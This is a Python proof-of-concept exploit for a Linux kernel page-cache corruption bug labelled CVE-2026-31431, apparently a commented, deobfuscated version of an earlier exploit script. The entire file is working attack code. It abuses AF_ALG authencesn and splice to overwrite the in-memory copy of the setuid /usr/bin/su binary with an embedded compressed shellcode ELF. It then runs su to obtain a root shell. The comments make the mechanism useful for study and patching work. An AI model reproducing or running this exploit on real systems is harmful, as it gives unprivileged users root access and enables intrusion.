#!/usr/bin/env python3
# Deobfuscated PoC for CVE-2026-31431 ("copy-fail").
#
# Original: copy_fail_exp.py (one-letter aliases, raw numeric constants, hex blobs).
# This file: same behavior, named constants, explanatory comments.
#
# Bug class: page-cache corruption via AF_ALG splice. The authencesn AEAD
# does an internal scratch copy of bytes 4..7 of the AAD into the destination
# buffer at dst[assoclen + cryptlen]. The vulnerable AF_ALG in-place path
# uses the spliced page-cache page as the destination buffer, so that scratch
# copy lands in the page cache instead of in private kernel memory.
# Result: 4 attacker-chosen bytes per call, written to a chosen offset in the
# in-memory copy of a file the attacker only has read access to.
# Used here to overwrite /usr/bin/su (setuid-root) with a 160-byte static ELF
# that runs /bin/sh as root. The on-disk file is never modified.

import os
import socket
import struct
import zlib

# --- Crypto parameters chosen to reach the buggy code path -------------------
#
# 40-byte AEAD key blob for authenc-style algorithms:
#   rtattr header (4B): rta_len=8, rta_type=1 (CRYPTO_AUTHENC_KEYA_PARAM)
#   enckeylen (4B BE): 16  -> AES-128 split
#   key bytes (32B):   16B HMAC key + 16B AES key, all zeros
# Zero key/IV: not for cryptographic reasons - just the laziest way to keep
# the kernel from rejecting the request before we reach the bug.
AEAD_KEY = bytes.fromhex("0800010000000010" + "00" * 32)

AAD_LEN   = 8                                  # 8-byte AAD: bytes 0..3 are filler, bytes 4..7 are the payload that gets copied into page cache
AUTH_SIZE = 4                                  # AEAD tag length; affects cryptlen and so the offset of the scratch write, not its size (size is hardcoded to 4 by authencesn)
OP        = socket.ALG_OP_DECRYPT
IV        = struct.pack("<I", 16) + b"\x00" * 16  # struct af_alg_iv: ivlen=16, then 16 zero bytes

TARGET_PATH = "/usr/bin/su"


# 160-byte hand-rolled static x86-64 ELF. Entry point is shellcode that does:
#     setreuid(0, 0); execve("/bin/sh", NULL, NULL); exit(0);
# Stored zlib-compressed because the original PoC did the same.
PATCH_ELF = zlib.decompress(bytes.fromhex(
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d"
    "209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675"
    "c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
))


def overwrite_chunk(file_fd: int, offset: int, four_bytes: bytes) -> None:
    """Overwrite 4 bytes at `offset` in the page-cache copy of file_fd."""
    sock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
    # authencesn = authenc with IPsec extended sequence numbers. Required for
    # the bug: it is the AEAD whose internal scratch copy of AAD[4:8] into
    # dst[assoclen + cryptlen] is what writes into the spliced page. Other
    # AEADs like gcm(aes) do not have that scratch write and cannot be used.
    sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    sock.setsockopt(socket.SOL_ALG, socket.ALG_SET_KEY, AEAD_KEY)
    sock.setsockopt(socket.SOL_ALG, socket.ALG_SET_AEAD_AUTHSIZE, None, AUTH_SIZE)

    op_sock, _ = sock.accept()

    # 8-byte AAD. Bytes 0..3 ("AAAA") are filler. Bytes 4..7 are what gets
    # copied verbatim into the page cache.
    op_sock.sendmsg(
        [b"AAAA" + four_bytes],
        [
            (socket.SOL_ALG, socket.ALG_SET_IV,            IV),
            (socket.SOL_ALG, socket.ALG_SET_OP,            struct.pack("<I", OP)),
            (socket.SOL_ALG, socket.ALG_SET_AEAD_ASSOCLEN, struct.pack("<I", AAD_LEN)),
        ],
        socket.MSG_MORE,
    )

    # Splice picks splice_len bytes from the file into the pipe as page
    # references, then into the AF_ALG socket. The in-place AEAD path uses
    # those same pages as the destination buffer. The scratch write at
    # dst[assoclen + cryptlen] = dst[offset + 8] lands at file offset `offset`.
    splice_len = offset + 4

    pipe_r, pipe_w = os.pipe()
    os.splice(file_fd, pipe_w, splice_len, offset_src=0)
    os.splice(pipe_r, op_sock.fileno(), splice_len)

    try:
        op_sock.recv(8 + offset)
    except OSError:
        pass

    os.close(pipe_r)
    os.close(pipe_w)
    op_sock.close()
    sock.close()


def main() -> None:
    fd = os.open(TARGET_PATH, os.O_RDONLY)
    try:
        for i in range(0, len(PATCH_ELF), AUTH_SIZE):
            overwrite_chunk(fd, i, PATCH_ELF[i:i + AUTH_SIZE])
    finally:
        os.close(fd)

    # TARGET_PATH is setuid-root. The kernel will exec our patched page-cache
    # version, which spawns /bin/sh as uid 0.
    os.system(TARGET_PATH)


if __name__ == "__main__":
    main()
